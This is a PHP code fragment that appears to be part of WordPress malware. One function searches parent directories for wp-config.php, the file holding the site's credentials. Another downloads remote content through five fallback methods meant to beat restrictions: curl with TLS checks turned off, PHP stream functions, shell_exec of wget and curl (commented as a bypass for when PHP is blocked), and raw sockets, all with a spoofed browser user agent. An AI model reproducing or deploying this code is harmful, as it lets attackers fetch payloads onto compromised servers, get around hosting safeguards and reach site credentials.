function _scan_dir() {
    $p = __DIR__;
    for ($i = 0; $i < 6; $i++) {
        if (file_exists($p . '/wp-config.php')) return $p . '/wp-config.php';
        $p = dirname($p);
    }
    return false;
}

function _dl_invincible($url) {
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
    $parse = parse_url($url);
    $host = $parse['host'];
    $path = isset($parse['path']) ? $parse['path'] : '/';
    $scheme = isset($parse['scheme']) ? $parse['scheme'] : 'http';

    // --- LAPIS 1: PHP CURL ---
    if(function_exists('curl_init')){
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        $d = @curl_exec($ch);
        curl_close($ch);
        if($d && strlen($d) > 0) return $d;
    }

    // --- LAPIS 2: FILE GET CONTENTS ---
    if(ini_get('allow_url_fopen')){
        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
        $ctx = stream_context_create($opts);
        $d = @file_get_contents($url, false, $ctx);
        if($d && strlen($d) > 0) return $d;
    }

    // --- LAPIS 3: FOPEN STREAM (CHUNKED) ---
    if(ini_get('allow_url_fopen')){
        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
        $ctx = stream_context_create($opts);
        $h = @fopen($url, 'rb', false, $ctx);
        if($h){
            $d = '';
            while(!feof($h)) $d .= fread($h, 8192);
            fclose($h);
            if(strlen($d) > 0) return $d;
        }
    }

    // --- LAPIS 4: SYSTEM EXEC (CLI BYPASS) ---
    // Ini mencoba menggunakan perintah Linux jika PHP diblokir
    if(function_exists('exec') || function_exists('shell_exec')){
        // Coba Wget
        $d = @shell_exec("wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url));
        if($d && strlen($d) > 0) return $d;
        
        // Coba Curl CLI
        $d = @shell_exec("curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url));
        if($d && strlen($d) > 0) return $d;
    }

    // --- LAPIS 5: RAW SOCKET ---
    $port = ($scheme == 'https') ? 443 : 80;
    $ssl = ($scheme == 'https') ? 'ssl://' : '';
    $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
    if($fp){
        $req  = "GET $path HTTP/1.1\r\n";
        $req .= "Host: $host\r\n";
        $req .= "User-Agent: $ua\r\n";
        $req .= "Connection: Close\r\n\r\n";
        fwrite($fp, $req);
        $body = ''; $in_body = false;
        while (!feof($fp)) {
            $line = fgets($fp, 4096);
            if($in_body) $body .= $line;
            if($line == "\r\n") $in_body = true;
        }
        fclose($fp);
        if(strlen($body) > 0) return $body;
    }

    return false;
}
